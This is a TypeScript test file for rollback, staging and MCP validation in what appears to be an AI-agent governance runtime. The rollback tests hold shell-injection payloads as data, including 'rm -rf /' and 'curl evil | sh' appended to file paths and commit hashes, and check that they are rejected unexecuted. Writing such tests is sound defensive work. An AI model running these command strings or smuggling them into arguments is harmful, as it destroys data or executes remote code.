// B3+B4 governance wrap-up: rollback hardening, commit atomicity, per-task staging.
// Rollback injection, MCP validation + hash-chain binding.

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { Rollback } from "../../governor/rollback.js";
import { MemoryStore } from "../../memory/index.js";
import { runTask, type RuntimeDeps } from "../../kernel/runtime.js";
import { ScopeValidator } from "../../governor/scope.js";
import { AuditLog } from "../../governor/audit.js";
import { handleMcpMessage, __getAuditHashChain } from "../../cli/mcp_server.js";
import { mkdtempSync, existsSync } from "node:fs";
import { rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { Plan, ProjectState } from "../../kernel/schema/index.js";

const NOW = () => "2026-06-14T00:00:00Z";
let seq = 0;
const newId = () => `id-${++seq}`;
const fakeState: ProjectState = { goal: "g", active_task: null, branch: "main", phase: "IDLE", last_change: NOW() };

describe("B3: rollback hardening", () => {
  it("rejects shell injection in restore paths without executing", async () => {
    const dir = mkdtempSync(join(tmpdir(), "rb-inj-"));
    const memory = new MemoryStore({ root: dir });
    const commands: string[] = [];
    const rb = new Rollback({ runCommand: async (c) => { commands.push(c); return { ok: true, stdout: "", stderr: "" }; }, memory, now: NOW });
    for (const payload of ["src/a.ts; rm -rf /", "$(id > /tmp/pwn)", "src/a.ts && evil", "src/a.ts|evil"]) {
      const r = await rb.restore([payload]);
      expect(r.ok).toBe(false);
      expect(r.reason).toContain("unsafe path");
    }
    expect(commands.length).toBe(0);
    await rm(dir, { recursive: true, force: true }).catch(() => {});
  });
  it("rejects unsafe revert hashes without executing", async () => {
    const dir = mkdtempSync(join(tmpdir(), "rb-hash-"));
    const memory = new MemoryStore({ root: dir });
    const commands: string[] = [];
    const rb = new Rollback({ runCommand: async (c) => { commands.push(c); return { ok: true, stdout: "", stderr: "" }; }, memory, now: NOW });
    for (const bad of ["abc123; curl evil | sh", "main", "ZZZZZZZ"]) {
      const r = await rb.revert(bad);
      expect(r.ok).toBe(false);
      expect(r.reason).toContain("unsafe commit hash");
    }
    expect(commands.length).toBe(0);
    const ok = await rb.revert("abc1234");
    expect(ok.ok).toBe(true);
    expect(commands.length).toBe(1);
    expect(commands[0]).toContain("git revert --no-edit abc1234");
    await rm(dir, { recursive: true, force: true }).catch(() => {});
  });
  it("uses runCommandFile argv when provided", async () => {
    const dir = mkdtempSync(join(tmpdir(), "rb-file-"));
    const memory = new MemoryStore({ root: dir });
    const calls: Array<[string, string[]]> = [];
    const rb = new Rollback({
      runCommand: async () => ({ ok: true, stdout: "", stderr: "" }),
      runCommandFile: async (cmd, args) => { calls.push([cmd, args]); return { ok: true, stdout: "", stderr: "" }; },
      memory, now: NOW,
    });
    const r = await rb.restore(["src/a.ts", "src/b.ts"]);
    expect(r.ok).toBe(true);
    expect(calls).toEqual([["git", ["restore", "--", "src/a.ts", "src/b.ts"]]]);
    await rm(dir, { recursive: true, force: true }).catch(() => {});
  });
});

describe("B3: runtime wires restore(planFiles)", () => {
  let tmpDir: string;
  let memory: MemoryStore;
  beforeEach(() => { tmpDir = mkdtempSync(join(tmpdir(), "rt-restore-")); memory = new MemoryStore({ root: tmpDir }); seq = 0; });
  afterEach(async () => { try { await rm(tmpDir, { recursive: true, force: true }); } catch {} });

  it("verify fail restores plan files", async () => {
    const commands: string[] = [];
    const plan: Plan = { task: "t", scope: ["src/**"], risk: "low", files: ["src/a.ts"], steps: [{ order: 1, action: "edit", target: "src/a.ts" }], tests: [], rollback: "git revert", approval: "AUTO", createdAt: NOW(), frozen: true };
    const deps: RuntimeDeps = {
      planner: async () => ({ ...plan, createdAt: NOW(), frozen: true }),
      executor: async () => ({ planId: newId(), diff: "d", stagingPath: "/staging", status: "succeeded", startedAt: NOW(), attempt: 1 }),
      verifier: async () => ({ planId: "p", status: "fail", testsRun: 5, testsPassed: 0, testsFailed: 5, logSummary: "fail", autoFixAttempts: 0 }),
      scope: new ScopeValidator(), memory,
      rollback: new Rollback({ runCommand: async (c) => { commands.push(c); return { ok: true, stdout: "", stderr: "" }; }, memory, now: NOW }),
      audit: new AuditLog({ memory, now: NOW, newId }),
      now: NOW, newId, readProjectState: async () => fakeState,
    };
    const state = await runTask({ goal: "g", project: "p" }, deps);
    expect(state.decision).toBe("ROLLBACK");
    expect(state.memoryRolledBack).toBe(true);
    expect(commands.some((c) => c === "git restore -- src/a.ts")).toBe(true);
  });

  it("commit staging throw becomes ROLLBACK with incident (atomic)", async () => {
    const plan: Plan = { task: "t", scope: ["src/**"], risk: "low", files: ["src/a.ts"], steps: [{ order: 1, action: "edit", target: "src/a.ts" }], tests: [], rollback: "git revert", approval: "AUTO", createdAt: NOW(), frozen: true };
    (memory as any).commitStaging = async () => { throw new Error("disk full"); };
    const deps: RuntimeDeps = {
      planner: async () => ({ ...plan, createdAt: NOW(), frozen: true }),
      executor: async () => ({ planId: newId(), diff: "d", stagingPath: "/staging", status: "succeeded", startedAt: NOW(), attempt: 1 }),
      verifier: async () => ({ planId: "p", status: "pass", testsRun: 5, testsPassed: 5, testsFailed: 0, logSummary: "ok", autoFixAttempts: 0 }),
      scope: new ScopeValidator(), memory,
      rollback: new Rollback({ runCommand: async () => ({ ok: true, stdout: "", stderr: "" }), memory, now: NOW }),
      audit: new AuditLog({ memory, now: NOW, newId }),
      now: NOW, newId, readProjectState: async () => fakeState,
    };
    const state = await runTask({ goal: "g", project: "p" }, deps);
    expect(state.decision).toBe("ROLLBACK");
    expect(state.memoryCommitted).toBe(false);
    expect(state.memoryRolledBack).toBe(true);
    expect(state.reason).toContain("commit failed");
    expect(state.terminal).toBe(true);
  });
});

describe("B3: per-task staging isolation", () => {
  it("clearStagingTask does not wipe sibling task staging", async () => {
    const dir = mkdtempSync(join(tmpdir(), "staging-iso-"));
    const memory = new MemoryStore({ root: dir });
    await memory.writeToStaging("taskA/diff", "A");
    await memory.writeToStaging("taskB/diff", "B");
    await memory.clearStagingTask("taskA");
    expect(existsSync(join(dir, "staging", "taskA", "diff"))).toBe(false);
    expect(existsSync(join(dir, "staging", "taskB", "diff"))).toBe(true);
    await rm(dir, { recursive: true, force: true }).catch(() => {});
  });
});

describe("B4: MCP validation + hash chain", () => {
  it("rejects oversized evidence (>100 items)", async () => {
    const evidence = Array.from({ length: 101 }, () => ({ kind: "test", status: "pass", summary: "ok" }));
    const res = await handleMcpMessage({ jsonrpc: "2.0", id: 101, method: "tools/call", params: { name: "aios_verify_evidence", arguments: { contract: { version: 1, requiredEvidence: ["test"] }, evidence } } });
    expect(res.error?.code).toBe(-32602);
  });
  it("rejects unknown evidence kind", async () => {
    const res = await handleMcpMessage({ jsonrpc: "2.0", id: 102, method: "tools/call", params: { name: "aios_verify_evidence", arguments: { contract: { version: 1, requiredEvidence: ["test"] }, evidence: [{ kind: "hax", status: "pass" }] } } });
    expect(res.error?.code).toBe(-32602);
  });
  it("returns -32602 (not throw) when arguments missing", async () => {
    const res = await handleMcpMessage({ jsonrpc: "2.0", id: 103, method: "tools/call", params: { name: "aios_verify_evidence" } });
    expect(res.error?.code).toBe(-32602);
  });
  it("rejects record_audit without taskId and oversized note", async () => {
    const r1 = await handleMcpMessage({ jsonrpc: "2.0", id: 104, method: "tools/call", params: { name: "aios_record_audit", arguments: { phase: "PLAN" } } });
    expect(r1.error?.code).toBe(-32602);
    const r2 = await handleMcpMessage({ jsonrpc: "2.0", id: 105, method: "tools/call", params: { name: "aios_record_audit", arguments: { taskId: "t-p0b", phase: "PLAN", note: "x".repeat(9000) } } });
    expect(r2.error?.code).toBe(-32602);
  });
  it("valid record_audit advances the hash chain", async () => {
    const before = __getAuditHashChain().count();
    const res = await handleMcpMessage({ jsonrpc: "2.0", id: 106, method: "tools/call", params: { name: "aios_record_audit", arguments: { taskId: "t-p0b-chain", phase: "PLAN", note: "chain binding probe" } } });
    expect(res.error).toBeUndefined();
    expect(__getAuditHashChain().count()).toBe(before + 1);
  });
});
